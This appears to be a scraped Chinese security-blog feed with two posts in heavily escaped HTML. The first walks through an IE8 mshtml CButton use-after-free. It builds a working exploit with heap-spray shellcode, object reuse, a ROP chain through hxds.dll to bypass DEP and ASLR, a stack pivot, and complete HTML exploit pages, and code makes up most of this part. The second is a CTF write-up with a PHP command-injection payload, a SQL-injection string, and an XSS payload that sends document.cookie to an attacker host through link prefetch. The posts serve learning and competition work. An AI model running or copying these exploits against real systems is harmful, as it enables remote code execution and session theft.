mshtml!CButton::EnsureDefaultAttributes = &lt;no type information&gt;69fe3571 mshtml!CButton::GetDBindMethods = &lt;no type information&gt;在上面我们可以找到两个比较有用的函数6a28ee41 mshtml!CButton::CreateElement = &lt;no type information&gt;//很明显是一个按钮创建的过程6a28ed27 mshtml!CButton::scalar deleting &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;destructor&lt;/span&gt;&#39; = &amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;no&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;information&lt;/span&gt;&amp;gt;//猜测是按钮销毁的过程&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;我们对这两个地方下断点，直接利用地址进行断点设置&lt;/p&gt; &lt;p&gt;&lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170628234314578?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/p&gt; &lt;p&gt;跟踪调试一下&lt;/p&gt; &lt;p&gt;&lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170628234709488?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/p&gt; &lt;p&gt;我们发现了HeapAlloc函数 ，该函数位button按钮分配内存，查看一下分配的地址为0x70b2fa8 &lt;br&gt; &lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170628235304136?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/br&gt;&lt;/p&gt; &lt;p&gt;&lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170629000848146?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;&gt; &lt;br&gt; 至此button的分配已经完成&lt;/br&gt;&lt;/img&gt;&lt;/p&gt; &lt;h2 id=&quot;0x2-堆的释放&quot;&gt;0x2 堆的释放&lt;/h2&gt; &lt;p&gt;刚刚我们把断点设在了mshtml!CButton::scalar deleting destructor’ 函数这 在函数的中间我们发现了释放堆的代码，前三个压栈的是函数的参数，最后一个压栈的是要释放内存的地址0x70b2fa8 发现与申请的时候内存地址相吻合 堆的释放就结束了。0x3 堆的重用就在刚一开始的时候，程序崩溃的地方，访问di内存地址无效，造成的程序崩溃，成为能够控制代码执行的地方 0x4 与JS代码结合分析前面一部分我们只知道了，在程序执行时汇编代码所做的的操作，如果对应到JS代码上，应该怎么理解。 这里有几个猜想e1.appendChild(document.createElement(‘button’)); 执行了HeapAlloc函数e2.outerText = “”; 把button对象释放了e2.appendChild(document.createElement(‘body’)); 是的内存重用以上是对JS代码在堆上的操作进行的猜想。 下面修改一下验证代码，将上述payload改成如下所示 e0 = document.getElementById(“a”); e1 = document.createElement(“div”); e2 = document.createElement(“q”); e1.applyElement(e2); e1.appendChild(document.createElement(‘button’)); alert(“init create”); e1.applyElement(e0); e2.innerHTML = “”; alert(“delete？”); e2.appendChild(document.createElement(‘body’)); alert(“end”);经过试验得出以下结论 e1.appendChild(document.createElement(‘button’)); 为内存初始申请 堆的释放和再次使用在e2.innerHTML = “”;之后 和 e2.appendChild(document.createElement(‘body’));之后0x04 利用代码编写我们回到之前的程序崩溃的地方，edi中的值无效，所以取堆的dword的时候是没有值的。借着在虚表中查找函数地址，在虚表偏移0xDC的地方存在函数跳转的地址。整个正向的函数执行过程很清楚，具体是我们怎么使用这些条件。利用方法如下：在堆中喷满shellcode代码替换CButton对象的dword值，到自己指定函数虚表中查找（可以是0x0c0c0c0c or 0x1c1c1c1c）在虚表的0xDC偏移处，填写指定的shellcode地址最后直接执行就是了这里利用了一个关键技术，堆喷射技术，该技术是一种payload传递技术，它充分利用了javascript的特性。0x1 堆喷射为了控制虚表以及偏移处函数地址，我们在不知道精确地址的情况下可以采用堆喷射技术。无DEP保护的情况&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;//堆喷射 //Fix BSTR spec function alloc(bytes, mystr) { while (mystr.length&lt;bytes) mystr += mystr; return mystr.substr(0, (bytes-6)/2); } block_size = 0x1000; Padding = ‘’; NopSlide = ‘’; var Shellcode =unescape(‘%ud231%u30b2%u8b64%u8b12%u0c52%u528b%u8b1c%u0842%u728b%u8b20%u8012%u0c7e%u7533%u89f2%u03c7%u3c78%u578b%u0178%u8bc2%u207a%uc701%ued31%u348b%u01af%u45c6%u3e81%u6957%u456e%uf275%u7a8b%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701%u7c8b%ufcaf%uc701%u4b68%u6e33%u6801%u4220%u6f72%u2f68%u4441%u6844%u726f%u2073%u7468%u6172%u6874%u6e69%u7369%u2068%u6441%u686d%u6f72%u7075%u6368%u6c61%u6867%u2074%u6f6c%u2668%u6e20%u6865%u4444%u2620%u6e68%u2f20%u6841%u6f72%u334b%u3368%u206e%u6842%u7242%u4b6f%u7368%u7265%u6820%u7465%u7520%u2f68%u2063%u686e%u7865%u2065%u6368%u646d%u892e%ufee5%u534d%uc031%u5550%ud7ff’); for (c = 0; c &lt; block_size; c++){ NopSlide += unescape(‘%u1c1c’);} //shellcode hou NopSlide = NopSlide.substring(0,block_size - (Shellcode.length)); var OBJECT = Shellcode + NopSlide; OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb var evil = new Array(); for (var k = 0; k &lt; 0x350; k++) { evil[k] = OBJECT.substr(0, OBJECT.length); } alert(‘spray done !’);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;这一步只是将堆上喷满slip代码和shellcode。因为没有DEP所以不需要那么精准DEP保护情况先贴上精准喷射代码&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;//堆喷射 //Fix BSTR spec function alloc(bytes, mystr) { while (mystr.length&lt;bytes) mystr += mystr; return mystr.substr(0, (bytes-6)/2); } block_size = 0x1000; padding_size = 0xdFe; //这里必须根据自己的电脑来配置 为了对齐 Padding = ‘’; NopSlide = ‘’; var Shellcode =unescape(‘%ud231%u30b2%u8b64%u8b12%u0c52%u528b%u8b1c%u0842%u728b%u8b20%u8012%u0c7e%u7533%u89f2%u03c7%u3c78%u578b%u0178%u8bc2%u207a%uc701%ued31%u348b%u01af%u45c6%u3e81%u6957%u456e%uf275%u7a8b%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701%u7c8b%ufcaf%uc701%u4b68%u6e33%u6801%u4220%u6f72%u2f68%u4441%u6844%u726f%u2073%u7468%u6172%u6874%u6e69%u7369%u2068%u6441%u686d%u6f72%u7075%u6368%u6c61%u6867%u2074%u6f6c%u2668%u6e20%u6865%u4444%u2620%u6e68%u2f20%u6841%u6f72%u334b%u3368%u206e%u6842%u7242%u4b6f%u7368%u7265%u6820%u7465%u7520%u2f68%u2063%u686e%u7865%u2065%u6368%u646d%u892e%ufee5%u534d%uc031%u5550%ud7ff’); for (p = 0; p &lt; padding_size; p++){ Padding += unescape(‘%u1c1c’);} for (c = 0; c &lt; block_size; c++){ NopSlide += unescape(‘%u1c1c’);} //jmp NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length)); var OBJECT = Padding + Shellcode + NopSlide; OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb var evil = new Array(); for (var k = 0; k &lt; 0x350; k++) { evil[k] = OBJECT.substr(0, OBJECT.length); } alert(‘spray done !’);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;因为我们需要构造rop链所以，需要知道准确的跳转地址，这里我们需要一定的尝试与计算 首先我们不设置padding_size的大小 及 padding_size = 0x00; //offset to 0x0c0c0c0c inside our 0x1000 hex block我们观察一下0x1c1c1c1c所处的第一个堆块的位置0x1c0e0020 0x1c1c1c1c距离0x1c0e00200x1c1c1c1c-0x1c0e0020=0xe1bfc 因为每一个payload的大小是0x2000，这里引用别人的一张图，表述一下现在内存的情况 所以这里0xe1bfc%0x2000 = 0x1bfc 又因为unescape使得两个字节成为了一个字节，所以这里在填充的时候除2 padding_size = 0xdFe 我们看一下效果，发现成功定位，下一步工作就是替换虚表地址 0x2 对象占位这一步很关键，前面分析了edi为对象指针，在释放后重新使用。这一步我们见改写CButton的dword使他指向自己造的虚表，达到劫持程序流。这里需要了解为什么会占位成功。关于堆分配器有几件事我们需要知道： (1)由于内存动态分配和释放，会产生堆碎片； (2)堆内存块释放。会由前端或后端分配器回收(依赖操作系统). 分配器类似于缓存服务那样优化内存块分配。像之前提到堆分配和释放产生堆碎片(=bad)，为了较少堆碎片，新分配一块内存时，堆分配器会直接返回之前释放的一块同样大小的内存。从而减少了新分配的次数(=good)； (3)虽然堆内存是动态分配，但是分配器往往会连续的分配内存块 (为了减少堆碎片)这意味着从攻击者的角度来看堆是确定的。 连续的分配内存我们就可以在某个可预测的地址上布置我们的数据。所以我们要申请一个和以前大小一样的内存空间，前面的内存申请已经很详细了，申请了0x58字节，所以我们这里也要重复申请0x58字节大小的内存。 for(var i = 0; i&lt;0x550; i++)//这里必须根据自己的电脑来配置 { arr_div[i]= document.createElement(“div”); arr_div[i].title= junk.substring(0,(0x58-6)/2); }发现已经成功占位，eax=1c1c1c1c下一步就是call [eax+0xdc] &lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt; var arr_div = new Array(); var junk=unescape(“%u1c1c%u1c1c”); while (junk.length &lt; (0x100- 6)/2) { junk+=junk; } function helloWorld() { var e0 = null; var e1 = null; var e2 = null; try { e0 = document.getElementById(“a”); e1 = document.getElementById(“b”); e2 = document.createElement(“q”); e1.applyElement(e2); e1.appendChild(document.createElement(‘button’)); e1.applyElement(e0); e2.outerText = “”; e2.appendChild(document.createElement(‘body’)); } catch(e) { } CollectGarbage(); for(var i = 0; i&lt;0x550; i++)//这里必须根据自己的电脑来配置 { arr_div[i]= document.createElement(“div”); arr_div[i].title= junk.substring(0,(0x58-6)/2); } }&lt;/script&gt;&lt;/head&gt;&lt;body onload=“eval(helloWorld())”&gt;&lt;form id=“a”&gt;&lt;/form&gt;&lt;dfn id=“b”&gt;&lt;/dfn&gt;&lt;/body&gt;&lt;/html&gt;这里有个问题，经常占位不成功，也不知道为什么。。0x3 最终shellcode（含ROP）无DEP：最后写了一个没有带ROP的shellcode，能够成功劫持程序流，但不能继续执行（因为ie8自带DEP保护，必须用ROP绕过，日后再完善吧）最后的shellcode执行流程是首先进行堆喷射，其次利用对象占位将刚刚释放的内存改写，接着就是UAF漏洞的执行了，会跳转到0x0c0c0c0c的地方去执行恶意代码&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;//堆喷射 //Fix BSTR spec function alloc(bytes, mystr) { while (mystr.length&lt;bytes) mystr += mystr; return mystr.substr(0, (bytes-6)/2); } block_size = 0x1000; padding_size = 0x5FC; //offset to 0x0c0c0c0c inside our 0x1000 hex block Padding = ‘’; NopSlide = ‘’; var Shellcode =unescape(‘%ud231%u30b2%u8b64%u8b12%u0c52%u528b%u8b1c%u0842%u728b%u8b20%u8012%u0c7e%u7533%u89f2%u03c7%u3c78%u578b%u0178%u8bc2%u207a%uc701%ued31%u348b%u01af%u45c6%u3e81%u6957%u456e%uf275%u7a8b%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701%u7c8b%ufcaf%uc701%u4b68%u6e33%u6801%u4220%u6f72%u2f68%u4441%u6844%u726f%u2073%u7468%u6172%u6874%u6e69%u7369%u2068%u6441%u686d%u6f72%u7075%u6368%u6c61%u6867%u2074%u6f6c%u2668%u6e20%u6865%u4444%u2620%u6e68%u2f20%u6841%u6f72%u334b%u3368%u206e%u6842%u7242%u4b6f%u7368%u7265%u6820%u7465%u7520%u2f68%u2063%u686e%u7865%u2065%u6368%u646d%u892e%ufee5%u534d%uc031%u5550%ud7ff’); for (p = 0; p &lt; padding_size; p++){ Padding += unescape(‘%u0c0c’);} for (c = 0; c &lt; block_size; c++){ NopSlide += unescape(‘%u1c1c’);} //shellcode hou NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length)); var OBJECT = Padding + Shellcode + NopSlide; OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb var evil = new Array(); for (var k = 0; k &lt; 250; k++) { evil[k] = OBJECT.substr(0, OBJECT.length); } alert(‘spray done !’);var arr_div = new Array(); var junk=unescape(“%u0c0c%u0c0c”); while (junk.length &lt; (0x100- 6)/2) { junk+=junk; } function helloWorld() { var e0 = null; var e1 = null; var e2 = null; try { e0 = document.getElementById(“a”); e1 = document.getElementById(“b”); e2 = document.createElement(“q”); e1.applyElement(e2); e1.appendChild(document.createElement(‘button’)); e1.applyElement(e0); e2.outerText = “”; e2.appendChild(document.createElement(‘body’)); } catch(e) { } CollectGarbage(); for(var i = 0; i&lt;0x550; i++) { arr_div[i]= document.createElement(“div”); arr_div[i].title= junk.substring(0,(0x58-6)/2); } }&lt;/script&gt;&lt;/head&gt;&lt;body onload=“eval(helloWorld())”&gt;&lt;form id=“a”&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;有DEP： 上述情况是在xp情况下 可以实行的应为没有windows的保护机制，而在本实验环境下是不能够实行的，在win7的ie8下有alsr以及dep的保护我们采取的措施是使用未开启alsr 的office2010的hxds.dll以及构造ROP链关闭ie8的数据保护。 使用location.href = ‘ms-help://‘可以让ie浏览器自动加载hxds.dll模块（一般情况下ASLR是关掉的） 首先让浏览器加载hxds.dll &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script type=“text/javascript”&gt; location.href = ‘ms-help://‘; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;利用immunity Debugger 的mona插件寻找rop链 下面给出一种rop链的构造方法var ropchain =“%u34b4%u51bf“ + // 0x51bf34b4 # POP ESI # RETN [hxds.dll] “%u10b8%u51bd“ + // 0x51bd10b8 # ptr to &amp;VirtualProtect() [IAT hxds.dll]“%u2d97%u51bd“ + // 0x51bd2d97 # MOV EAX,DWORD PTR DS:[ESI] # RETN [hxds.dll] “%ucba0%u51bd“ + // 0x51bdcba0 # XCHG EAX,ESI # RETN 00 [hxds.dll] “%u79e2%u51c3“ + // 0x51c379e2 # POP EBP # RETN [hxds.dll] “%u9683%u51c5“ + // 0x51c59683 # &amp; call esp [hxds.dll]“%u6fbd%u51c5“ + // 0x51c56fbd # POP EAX # RETN [hxds.dll] “%ufdfe%ua17f“ + // 0xa17ffdfe # put delta into eax (-&gt; put 0x00000201 into ebx)“%u1e01%u51c1“ + // 0x51C11E01 # ADD EAX,5E800403 # RETN [hxds.dll] “%u92d8%u51c3“ + // 0x51C392D8 # XCHG EAX,EBX # RETN [hxds.dll]“%ue67d%u51bf“ + // 0x51BFE67D # XOR EAX,EAX # RETN [hxds.dll] “%u6fbd%u51c5“ + // 0x51c56fbd # POP EAX # RETN [hxds.dll] “%ufc3d%ua17f“ + // 0xa17ffc3d # put delta into eax (-&gt; put 0x00000040 into edx)“%u1e01%u51c1“ + // 0x51C11E01 # ADD EAX,5E800403 # RETN [hxds.dll] “%u592b%u51bf“ + // 0x51BF592B # XCHG EAX,EDX # RETN [hxds.dll] “%ucf3e%u51be“ + // 0x51becf3e # POP ECX # RETN [hxds.dll] “%ud150%u51c5“ + // 0x51c5d150 # &amp;Writable location [hxds.dll]“%uf563%u51be“ + // 0x51bef563 # POP EDI # RETN [hxds.dll] “%u7402%u51c0“ + // 0x51c07402 # RETN (ROP NOP) [hxds.dll]“%u6fbd%u51c5“ + // 0x51c56fbd # POP EAX # RETN [hxds.dll] “%u9090%u9090“ + // 0x90909090 # nop“%ua8dc%u51bd“; // 0x51BDA8DC # PUSHAD # POP ECX # RETN [hxds.dll]有了rop了链以及精准堆喷射,现在只需要stack pivot就OK了 同样我们使用hxds.dll中的rop构造栈翻转var stackpivot += “%ub30e%u51c3“; // 0x51c3b30e # RETN [hxds.dll] (align esp)stackpivot += “%u198c%u51be“; // 0x51be198c # POP EBX # RETN [hxds.dll] stackpivot += “%u4a41%u51be“; // 0x51be4a41 # XCHG EAX,ESP # RETN [hxds.dll]第一次执行第三行的XCHG代码使得栈翻转到堆上第一行的位置，执行第二行的时候正好将XCHG POP进ebx中去 避免了第二次翻转下面是完整代码&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt; var arr_div = new Array(); var junk=unescape(“%u0b30%u0c0c“); while (junk.length &lt; (0x100- 6)/2) { junk+=junk; } var nops=unescape(“%u9090%u9090“); while(nops.length&lt;0x400) nops+=nops; while(nops.length&lt;0x5f2) nops+=unescape(“%ub30e%u51c3“); nops+=unescape(“%u198c%u51be“); var code =unescape( “%u4a41%u51be%u34b4%u51bf%u10b8%u51bd%u2d97%u51bd%ucba0%u51bd“+ “%u79e2%u51c3%u9683%u51c5%u6fbd%u51c5%ufffe%ua17f“+ “%u1e01%u51c1%u92d8%u51c3%ue67d%u51bf%u6fbd%u51c5“+ “%ufc3d%ua17f%u1e01%u51c1%u592b%u51bf%ucf3e%u51be“+ “%ud150%u51c5%uf563%u51be%u7402%u51c0%u6fbd%u51c5“+ “%u9090%u9090%ua8dc%u51bd“+ //ROP结束 “%uc481%uf254%uffff%u2ebf%ue4ed%udbc0%ud9c8%u2474“ + //shellcode calc.exe “%u58f4%uc933%u33b1%u7831%u0312%u1278%uee83%u06e9“ + “%u1235%u4f19%ueab6%u30da%u0f3e%u62eb%u4424%ub35e“ + “%u082e%u3853%ub862%u4ce0%ucfab%ufa41%ufe8d%uca52“ + “%uac11%u4c91%uaeee%uaec5%u61cf%uae18%u9f08%ue2d3“ + “%ud4c1%u1346%ua865%u125a%ua7a9%u6ce3%u77cc%uc697“ +a “%ua7cf%u5c08%u5f87%u3a22%u5e38%u58e7%u2904%uab8c“ + “%ua8fe%ue244%u9bff%ua9a8%u14c1%ub325%u9206%uc6d6“ + “%ue17c%ud16b%u9846%u54b7%u3a5b%uce33%ubbbf%u8990“ + “%ub734%udd5d%udb13%u3260%ue728%ub5e9%u6eff%u91a9“ + “%u2bdb%ubb69%u917a%uc4dc%u7d9d%u6080%u6fd5%u13d5“ + “%ue5b4%u9128%u40c2%ua92a%ue2cc%u9843%u6d47%u2513“ + “%uca82%u6feb%u7a8f%u3664%u3f45%uc9e9%u03b3%u4a14“ + “%ufb36%u52e3%ufe33%ud4a8%u72af%ub0a0%u21cf%u90c1“ + “%ua4b3%u7851%u431a%u1bd2%u4162“); var offset=0x5F4; var junk_offset=nops.substring(0,0x5F4); var shellcode=junk_offset+code+nops.substring(0,0x800-0x5F4-code.length); while(shellcode.length&lt;0x40000) { shellcode+=shellcode; } var block = shellcode.substring(0,0x40000); var heap_chunks = new Array(); for (var i=1; i &lt; 0x700; i++) heap_chunks[i] = block.substring(0,0x40000); //location.href = ‘ms-help://‘; function helloWorld() { //alert(1); var e0 = null; var e1 = null; var e2 = null; try { e0 = document.getElementById(“a”); e1 = document.getElementById(“b”); e2 = document.createElement(“q”); e1.applyElement(e2); e1.appendChild(document.createElement(‘button’)); e1.applyElement(e0); e2.outerText = “”; e2.appendChild(document.createElement(‘body’)); } catch(e) { } CollectGarbage(); for(var i = 0; i&lt;0x50; i++) { arr_div[i]= document.createElement(“div”); arr_div[i].title= junk.substring(0,(0x58-6)/2); } } &lt;/script&gt;&lt;/head&gt;&lt;body onload=“helloWorld()”&gt; &lt;form id=“a”&gt; &lt;/form&gt; &lt;dfn id=”b”&gt; &lt;/dfn&gt;&lt;/body&gt;&lt;/html&gt;0x05 实验结果]]></content>
      <tags>
        <tag>漏洞调试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 某校赛 Writeup]]></title>
    <url>%2F2017%2F06%2F25%2F2017%20%E6%9F%90%E6%A0%A1%E8%B5%9B%20Writeup%2F</url>
    <content type="text"><![CDATA[这次校赛的时候只做了web题 ，。。。。 这次校赛的时候只做了web题 ，。。。。WEB0x01 admin直接扫描出来robots.txt 访问得到 访问admin 注意把cookie 的admin项改成10x02 babyphp浏览网页，发现了猫腻 本题有.git泄露可以直接下到源码，一开始以为是版本控制，但发现只有本地git只有一个版本 接下来下到了源码 一道很明显的执行命令的题目，只需要闭合引号和括号即可 最后构造page=’.system(“ls”).’home 命令执行一番还是发现无果 最后利用git diff比较分支查到了flag 0x03 inject一道简单的注入题目 搜索目录找到了备份文件&lt;?phprequire(“config.php”);$table = $_GET[‘table’]?$_GET[‘table’]:“test”;$table = Filter($table);mysqliquery($mysqli,“desc `secret{$table}&quot;&lt;/span&gt;) &lt;span class=&quot;hljs-keyword&quot;&gt;or&lt;/span&gt; Hacker(); &lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;&quot;select &#39;flag{xxx}&#39; from secret_{$table}&quot;&lt;/span&gt;; &lt;span class=&quot;hljs-variable&quot;&gt;$ret&lt;/span&gt; = sql_query(&lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt;); &lt;span class=&quot;hljs-keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$ret&lt;/span&gt;[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]; &lt;span class=&quot;hljs-preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;首先&lt;code&gt;mysqli_query($mysqli,&quot;desc&lt;/code&gt;secret_{$table}&lt;code&gt;&quot;) or Hacker();&lt;/code&gt;要执行成功 &lt;br&gt; 其次是注入语句 &lt;br&gt; 我们可以构造table=test&lt;code&gt;&lt;/code&gt;union select ···的语句查询 &lt;br&gt; 第一次我构造了 &lt;br&gt; test where 1=2 union select 1 from secret_flag &lt;br&gt; &lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170625072115709?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt; &lt;p&gt;后来才知道D是查询为空，只能换种写法 &lt;br&gt; test union select 1 from secret_flag limit 1,1 &lt;br&gt; &lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170625072429407?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt; &lt;p&gt;有了显示位下面就是正常的注入流程。 &lt;br&gt; 利用test union select flagUwillNeverKnow from secret_flag limit 1,1 &lt;br&gt; 最后得到flag&lt;/br&gt;&lt;/br&gt;&lt;/p&gt; &lt;h2 id=&quot;0x04-babyxss&quot;&gt;0x04 babyxss&lt;/h2&gt; &lt;p&gt;一道简单的xss题目，一开始一直犯sb，经提示，恍然大悟。&lt;/p&gt; &lt;h3 id=&quot;0x1-验证码&quot;&gt;0x1 验证码&lt;/h3&gt; &lt;p&gt;验证码就不说啥了，经常遇见这里再贴上脚本&lt;/p&gt; &lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs python&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; random &lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; string &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(str)&lt;/span&gt;:&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; hashlib m = hashlib.md5() m.update(str) &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; m.hexdigest() &lt;span class=&quot;hljs-keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;: string = &lt;span class=&quot;hljs-string&quot;&gt;&#39;&#39;&lt;/span&gt; s = string.join(random.sample(&lt;span class=&quot;hljs-string&quot;&gt;&#39;qwertyuiopasdfghjklzxcvbnm1234567890&#39;&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;)) &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; md5(s)[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;] == &lt;span class=&quot;hljs-string&quot;&gt;&#39;58a204&#39;&lt;/span&gt;: &lt;span class=&quot;hljs-keyword&quot;&gt;print&lt;/span&gt; s &lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt; &lt;h3 id=&quot;0x2-绕过csp&quot;&gt;0x2 绕过csp&lt;/h3&gt; &lt;p&gt;现在绕过csp的方法很简单，也很固定利用chrome的prefetch属性进行预加载绕过。 &lt;br&gt; 观察发现此题是严格csp限制 &lt;br&gt; &lt;code&gt;default-src &#39;self&#39;; script-src &#39;self&#39; ;&lt;/code&gt; &lt;br&gt; 只能加载同源脚本，一般XSS是支持内联脚本的。 &lt;br&gt; 那么现在又有个问题，我们怎么能加载同源可控脚本呢？&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt; &lt;h3 id=&quot;0x3-上传同源可控脚本&quot;&gt;0x3 上传同源可控脚本&lt;/h3&gt; &lt;p&gt;这里我首先发送标签 &lt;br&gt; &lt;code&gt;&amp;lt;link rel=&quot;prefetch&quot; href=&quot;http://xxxx/XSS/?c=[cookie]&quot;&amp;gt;&lt;/code&gt; &lt;br&gt; 在我XSS平台上收到了一个带有referer字段的http包 &lt;br&gt; 里面有admin网址，以及我发送的留言信息。&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt; &lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs avrasm&quot;&gt; var n0t = document&lt;span class=&quot;hljs-preprocessor&quot;&gt;.createElement&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;link&quot;&lt;/span&gt;)&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt; n0t&lt;span class=&quot;hljs-preprocessor&quot;&gt;.setAttribute&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;rel&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;prefetch&quot;&lt;/span&gt;)&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt; n0t&lt;span class=&quot;hljs-preprocessor&quot;&gt;.setAttribute&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;href&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;http://xxxx/?a=&quot;&lt;/span&gt;+document&lt;span class=&quot;hljs-preprocessor&quot;&gt;.cookie&lt;/span&gt;)&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt; document&lt;span class=&quot;hljs-preprocessor&quot;&gt;.head&lt;/span&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;.appendChild&lt;/span&gt;(n0t)&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt; &amp;lt;link rel=&lt;span class=&quot;hljs-string&quot;&gt;&quot;prefetch&quot;&lt;/span&gt; href=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://xxxxx/?c=[cookie]&quot;&lt;/span&gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;这点我已开始没想到····，耽误了好长时间&lt;/p&gt; &lt;h3 id=&quot;0x4-利用组合姿势xss&quot;&gt;0x4 利用组合姿势XSS&lt;/h3&gt; &lt;p&gt;有了同源可控脚本我们再次上传一个&lt;/p&gt; &lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;http://39.108.192.25:5004/4dmIn.php?id=eef85d17855c8aca3c9df877511cfe17&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;就可以把我们的脚本当做js脚本引用执行&lt;/p&gt; 